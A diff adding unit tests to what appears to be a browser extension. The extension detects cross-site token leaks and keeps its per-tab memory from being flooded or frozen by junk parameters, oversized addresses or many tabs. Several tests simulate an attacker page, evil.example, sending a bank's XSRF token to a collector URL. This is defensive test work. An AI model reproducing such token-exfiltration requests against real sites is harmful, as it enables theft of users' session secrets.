@@ -395,3 +395,63 @@ test('T: no row title, row sentence or level sentence is longer than 140 charact
   for (const t of [...GROUPS.flatMap((g) => [g.title, g.says]), ...levels]) assert.ok(t.length <= 140, `${t.length}: ${t}`);
   for (const g of GROUPS) { const w = g.title.split(/\s+/).length; assert.ok(w >= 2 && w <= 5, g.title); assert.equal(/[;()]/.test(g.title + g.says), false, g.id); }
 });
+
+// ---- Q-batch, final audit (1.32): the F4 memory cannot be flooded or frozen, and fails safe
+const xtabOf = (bg, id) => (bg.state.session.xtab || {})['t' + id];
+const reflect = async (bg, url, how = 'get') => {
+  if (how === 'post') await bg.request({ url, method: 'POST', requestBody: { formData: { q: [TOK] } }, type: 'main_frame', tabId: 1, frameId: 0, initiator: 'https://evil.example' });
+  else await bg.request({ url, type: 'main_frame', tabId: 1, frameId: 0, initiator: 'https://evil.example' });
+  await bg.settle(); await bg.navigate(1, url); await bg.settle();
+  await bankEcho(bg, TOK, 1); await bg.request({ url: 'https://evil.example/c/x?t=' + TOK, initiator: 'https://evil.example', type: 'image', tabId: 1, frameId: 0 }); await bg.settle();
+  await bg.alarm('sweep'); };
+const victim = async () => { const bg = await balanced({ cookies: [{ name: 'XSRF-TOKEN', domain: 'bank.example', value: 'x-77aa66bb55cc' }] });
+  await bg.opens('https://evil.example/'); await bg.opens('https://bank.example/'); return bg; };
+test('final 1 (E6): twenty junk id-like parameters before the reflected value do not hide it', async () => {
+  const bg = await victim(), junk = Array.from({ length: 20 }, (_, i) => `p${i}=j${i}xAb12Cd34Ef`).join('&');
+  await reflect(bg, `https://bank.example/search?${junk}&q=${TOK}`);
+  assert.equal(xblock(bg, 'https://bank.example/api/accounts'), undefined); assert.deepEqual(await bg.names(), ['XSRF-TOKEN']);
+});
+test('final 1: a live address longer than 64 KB makes every own send of that tab an echo (fail safe)', async () => {
+  const bg = await victim();
+  await reflect(bg, `https://bank.example/search?pad=${'a'.repeat(70000)}&z=${TOK.split('').reverse().join('')}`);
+  assert.equal(xblock(bg, 'https://bank.example/api/accounts'), undefined);
+});
+test('final 2a (E7): a set filled by junk hops still takes a value handed in afterwards', async () => {
+  const bg = await victim(), junk = (k) => Array.from({ length: 20 }, (_, i) => `j${k}x${i}Ab12Cd34Ef`).join('&');
+  for (let k = 0; k < 3; k++) { await bg.chrome.webRequest.onCompleted.fire({ url: `https://bank.example/r?${junk(k)}`, type: 'main_frame', statusCode: 200, tabId: 1, frameId: 0 }); await bg.settle(); }
+  await bg.chrome.webRequest.onCompleted.fire({ url: `https://bank.example/search?q=${TOK}`, type: 'main_frame', statusCode: 200, tabId: 1, frameId: 0 }); await bg.settle();
+  await bg.navigate(1, 'https://bank.example/search'); await bg.settle();   // the live address no longer has it
+  await bankEcho(bg, TOK, 1); await evilSends(bg, TOK); await bg.alarm('sweep');
+  assert.equal(xblock(bg, 'https://bank.example/api/accounts'), undefined);
+});
+test('final 2b: a tab whose set overflows is marked full, and every own send of that tab on that site is an echo', async () => {
+  const bg = await victim();
+  for (let k = 0; k < 15; k++) { await bg.chrome.webRequest.onCompleted.fire({ url: `https://bank.example/r?${Array.from({ length: 20 }, (_, i) => `v${i}=k${k}x${i}Ab12Cd34Ef`).join('&')}`, type: 'main_frame', statusCode: 200, tabId: 1, frameId: 0 }); await bg.settle(); }
+  assert.equal(xtabOf(bg, 1).full, true);
+  await bg.navigate(1, 'https://bank.example/search'); await bg.settle();
+  await bankEcho(bg, TOK, 1); await evilSends(bg, TOK); await bg.alarm('sweep');
+  assert.equal(xblock(bg, 'https://bank.example/api/accounts'), undefined);
+});
+test('final 2c (E3): after 200 other tabs a long-lived tab keeps its set (oldest go first), and a closed tab\'s entry goes', async () => {
+  const bg = await victim();
+  for (let id = 2; id <= 260; id++) await bg.chrome.webRequest.onCompleted.fire({ url: `https://s${id}.example/?x=Ab12Cd34Ef56Gh${id}`, type: 'main_frame', statusCode: 200, tabId: id, frameId: 0 });
+  await bg.settle();
+  // a long-lived low-id tab is written last: it is the newest entry and stays; the oldest others went
+  await bg.request({ url: 'https://bank.example/search', method: 'POST', requestBody: { formData: { q: [TOK] } }, type: 'main_frame', tabId: 1, frameId: 0, initiator: 'https://evil.example' }); await bg.settle();
+  await bg.navigate(1, 'https://bank.example/search'); await bg.settle();
+  assert.ok(xtabOf(bg, 1)); assert.ok(Object.keys(bg.state.session.xtab).length <= 200); assert.equal(xtabOf(bg, 2), undefined);
+  await bankEcho(bg, TOK, 1); await evilSends(bg, TOK); await bg.alarm('sweep');
+  assert.equal(xblock(bg, 'https://bank.example/api/accounts'), undefined);
+  await bg.chrome.tabs.onRemoved.fire(260, {}); await bg.settle(); assert.equal(xtabOf(bg, 260), undefined);
+});
+test('final 6: nothing is noted about addresses with the main switch off or the codes row off', async () => {
+  for (const storage of [{ master: false }, { modes: { C33: 'off' } }]) {
+    const bg = await balanced({ storage }); await bg.chrome.webRequest.onCompleted.fire({ url: `https://bank.example/search?q=${TOK}`, type: 'main_frame', statusCode: 200, tabId: 1, frameId: 0 }); await bg.settle();
+    assert.equal(bg.state.session.xtab, undefined, JSON.stringify(storage)); }
+});
+test('final 3: the Balanced line and the first-run line say codes are cut without asking, and that it reads what pages send here only', () => {
+  const base = { now: 1.8e12, master: true, level: 'balanced', hold: {}, groups: [], log: [], allow: [], always: [], sitesOff: [], undo: [] };
+  assert.match(renderPopup(base, null), /codes seen on two sites are cut and their collector blocked without asking/i);
+  const first = /<p class="c">On: .*?<\/p>/.exec(renderPopup({ ...base, firstRun: true }, null))[0];
+  assert.match(first, /codes seen on two sites/i); assert.match(first, /reads what pages send, on this computer only/);
+});
